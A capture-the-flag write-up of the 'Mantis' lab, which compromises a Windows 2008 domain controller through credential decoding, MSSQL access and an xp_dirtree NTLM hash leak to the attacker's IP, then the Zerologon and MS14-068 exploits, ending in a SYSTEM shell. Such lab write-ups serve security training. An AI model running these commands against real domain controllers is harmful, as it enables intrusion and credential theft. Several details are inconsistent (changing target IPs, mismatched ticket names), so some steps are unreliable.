
## CTF Writeup: Mantis

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.44.71
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 12:40 -0500
Nmap scan report for 10.129.44.71
Host is up (0.022s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-08-03 17:41:16Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.44.71:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
|_ssl-date: 2026-08-03T17:42:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-03T17:38:19
|_Not valid after:  2056-08-03T17:38:19
| ms-sql-info: 
|   10.129.44.71:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  msrpc        Microsoft Windows RPC
49180/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2026-08-03T17:42:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-03T17:38:19
|_Not valid after:  2056-08-03T17:38:19
| ms-sql-ntlm-info: 
|   10.129.44.71:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info: 
|   10.129.44.71:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 34m17s, deviation: 1h30m43s, median: 0s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-08-03T17:42:14
|_  start_date: 2026-08-03T17:38:13
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2026-08-03T13:42:15-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.39 seconds
```

Judging from 53 and 389 open we assume that the target server seems to be an Domain Controller. It reveals the Hostname, the FQDN & the domain of the target. Let's map those to our target ip address in our local dns file.

```
echo "10.129.44.71 MANTIS.htb.local htb.local MANTIS" | tee -a /etc/hosts
```

Started off with enumerating SMB Shares as anonymous & guest user. But both seemed to be either disabled or the access was denied.

```
nxc smb htb.local -u 'guest' -p '' --shares
```

Tried enumerating ldap anonymously, but didn't work.

```
ldapsearch -x -H ldap://10.129.44.71 -b "dc=htb,dc=local" > ldapsearch.txt
```

There seems to be aswell 2 webservers running on port 1337 & port 8080. Also SMB seems to be an Windows Server 2008, this could be vulnerable to EternalBlue --> it's not.

The website itself is blank.

Started with enumerating endpoints on the website running on port 1337.

```
dirsearch -u http://10.129.44.71:1337
```

```
feroxbuster --url http://10.129.44.71:1337
```

Enumerated an interesting /secure_notes and an /orchard endpoint.

```
feroxbuster --url http://htb.local:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Enumerated subdomains. But couldn't find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://htb.local:1337 -H "Host: FUZZ.htb.local" -fs 689
```

Let's proceed with enumerating the 2nd webserver running on port 8080.

The website itself is an block it has comment creation functionality with an url field. I tried to perform an NTLM Relay Attack. This didn't work unfortunately.

I decided to proceed enumerating endpoints with feroxbuster.

```
feroxbuster --url http://htb.local:8080
```

There seemed to also be an interesting admin endpoint, which had an ReturnUrl Parameter set. Tried to perform NTLM Relay, but also didn't work.

```
http://htb.local:8080/Users/Account/LogOn?ReturnUrl=http%3A%2F%2F10.10.15.9
```

Enumerated subdomains, but this didn't work.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://htb.local:8080 -H "Host: FUZZ.htb.local" -fs 5897
```

Tried accessing rpcclient anonymously. But access got denied.

```
rpcclient -U "" -N htb.local
```

Decided to inspect the /secure_notes endpoint.

There seems to be dev notes in place. Upon inspecting it we get the information about an admin account in OrchardCMS and the "sa" account in mssql.

Scrolling all the way down to the note we got the password in hex format.

```
admin:010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
```

And potentially sa credentials.

```
sa:namez
sa:file
file:namez
```

I pasted the binary inside AI and got these credentials:

```
admin:@dm!n_P@ssW0rd!
```

The .txt file in the /secure_notes itself also seemed to have an base64 encoded string as filename. 

After decoding it I got an hex value.

```
echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d
6d2424716c5f53405f504073735730726421
```

```
echo "6d2424716c5f53405f504073735730726421" | xxd -r -p 
m$$ql_S@_P@ssW0rd!
```

This seems to be the mssql password.

```
admin:m$$ql_S@_P@ssW0rd!
```

Connected to the target server.

```
impacket-mssqlclient admin:'m$$ql_S@_P@ssW0rd!'@htb.local
```

Tested if we have command execution. But we don't seem to have the permission for this.

```
EXEC xp_cmdshell 'whoami';
```

Started up responder.

```
responder -I tun0
```

Tried NTLM Relay Attack using xp_dirtree

```
EXEC xp_dirtree '//10.10.15.9/fake_share/', 1, 0;
```

Captured NTLM Hash, but this one seems to be an machine account. Which we most likely can't crack.

```
MANTIS$::HTB:88d13e671b925355:4388E9595BD447F2AA0D7A3CF1213BBE:010100000000000000A320185423DD01B06E0F6E9CA55C4900000000020008005A004A003800300001001E00570049004E002D0055004F0051005600570058003000320058004600390004003400570049004E002D0055004F005100560057005800300032005800460039002E005A004A00380030002E004C004F00430041004C00030014005A004A00380030002E004C004F00430041004C00050014005A004A00380030002E004C004F00430041004C000700080000A320185423DD0106000400020000000800300030000000000000000000000000300000191C7C12F3F387A2552922F6B71C9B31B6939D830E26BA9836F9004DE2481C410A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E003900000000000000000000000000
```

Started with enumerating the database.

```
SELECT name FROM sys.databases;
SELECT * FROM orcharddb.information_schema.tables;
SELECT * FROM orcharddb.dbo.blog_Navigation_AdminMenuPartRecord;
```

This revealed credentials for user "james".

```
james:J@m3s_P@ssW0rd!
```

Enumerated users using nxc.

```
nxc smb htb.local -u james -p 'J@m3s_P@ssW0rd!' --rid-brute > newusers.txt
```

Formatted the wordlist accordingly and stored it inside an users.txt for bruteforcing.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Proceeded with downloading domain information using bloodhound-python.

```
bloodhound-python -u james -p 'J@m3s_P@ssW0rd!' -ns 10.129.44.78 -d htb.local -c all
```

Started up bloodhound.

```
bloodhound-start
```

Uploaded domain information in BloodHound and markes user "james" as owned.

Couldn't find anything interesting.

I decided to spray again and found out that user "james" can login into mssql database aswell!

```
nxc mssql htb.local -u users.txt -p passwords.txt --continue-on-success
```

Connected to the database.

```
impacket-mssqlclient james:'J@m3s_P@ssW0rd!'@10.129.44.88 -windows-auth
```

I utilized the following exploit to get SYSTEM Shell.

```
https://github.com/zeronetworks/zerologon/blob/master/zerologon.py
```

This one works on older machines especially. 

This exploits resets the DC Password to null!

```
python3 /opt/arsenal/zerologon.py MANTIS 10.129.44.88
Performing authentication attempts...
===========================================================================================================================================================================================================================================================================================
Success! DC can be fully compromised by a Zerologon attack.
```

Let's dump domain hashes.

```
impacket-secretsdump -no-pass -just-dc 'MANTIS$@10.129.44.88'
```

This didn't work.

After searching up for Exploits for Windows Server 2008 I found MS14-068.

Before running the exploit we'll need to get the SID of the user. This can be achieved through an tool called impacket-lookupsid.

```
impacket-lookupsid htb.local/james:'J@m3s_P@ssW0rd!'@10.129.44.88 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.44.88
[*] StringBinding ncacn_np:10.129.44.88[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4220043660-4019079961-2895681657
498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: HTB\Administrator (SidTypeUser)
501: HTB\Guest (SidTypeUser)
502: HTB\krbtgt (SidTypeUser)
512: HTB\Domain Admins (SidTypeGroup)
513: HTB\Domain Users (SidTypeGroup)
514: HTB\Domain Guests (SidTypeGroup)
515: HTB\Domain Computers (SidTypeGroup)
516: HTB\Domain Controllers (SidTypeGroup)
517: HTB\Cert Publishers (SidTypeAlias)
518: HTB\Schema Admins (SidTypeGroup)
519: HTB\Enterprise Admins (SidTypeGroup)
520: HTB\Group Policy Creator Owners (SidTypeGroup)
521: HTB\Read-only Domain Controllers (SidTypeGroup)
553: HTB\RAS and IAS Servers (SidTypeAlias)
571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
1000: HTB\MANTIS$ (SidTypeUser)
1101: HTB\DnsAdmins (SidTypeAlias)
1102: HTB\DnsUpdateProxy (SidTypeGroup)
1103: HTB\james (SidTypeUser)
1104: HTB\SQLServer2005SQLBrowserUser$MANTIS (SidTypeAlias)
```

Adding the ID "1103" to the Domain String will provide us the SID of the user.

```
S-1-5-21-4220043660-4019079961-2895681657-1103
```

Also make sure to sync the time with the DC accordingly.

```
rdate -n mantis.htb.local
```

We can utilize Metasploit in order to abuse this.

```
msfconsole -q
use admin/kerberos/ms14_068_kerberos_checksum
set DOMAIN htb.local
set RHOSTS mantis.htb.local
set USERNAME james
set PASSWORD J@m3s_P@ssW0rd!
set USER_SID S-1-5-21-4220043660-4019079961-2895681657-1103
exploit
```

Retrieved ..ccache ticket in:

```
/root/.msf4/loot/20260803162536_default_10.129.44.99_mit.kerberos.cca_909265.bin
```

moved it to current directory and changed name.

```
cp /root/.msf4/loot/20260803162536_default_10.129.44.99_mit.kerberos.cca_909265.bin james_ticket
```

Exported it inside kerberos variable.

```
export KRB5CCNAME=justin_ticket
```

Connected to the DC and gained SYSTEM Shell.

```
impacket-psexec -k -no-pass mantis.htb.local
```

Retrieved user.txt in C:\Users\james\Desktop.

```
6a67eff3f69f9ce7a17297b98273d53f
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
f345da9e5d1553adfc9254bc526b808d
```